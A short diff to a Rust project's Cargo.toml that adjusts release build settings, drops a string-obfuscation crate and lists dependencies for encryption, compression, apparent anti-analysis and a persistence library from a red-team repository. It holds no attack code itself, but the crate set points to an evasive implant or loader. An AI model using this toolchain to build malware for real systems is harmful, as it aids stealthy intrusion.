@@ -13,13 +13,11 @@ debug-assertions = false   # Removes debug-only checks (default is already false
 overflow-checks = false    # Removes integer overflow panic paths (default is false in release, explicit)
 debug = false              # No debug info at all (strip="symbols" implies this, but explicit is fine)
 
-
 [dependencies]
 aes-gcm = "0.11.1"
 antilysis = "0.2.2"
 busywork = "0.1.0"
 maple-rs = "0.1.2"
-obfstr = "0.4.6"
 rand = "0.10.3"
 zstd = "0.14.3"
 phantom_persist_rs = { git = "https://github.com/Teach2Breach/phantom_persist_rs.git", branch = "main" }
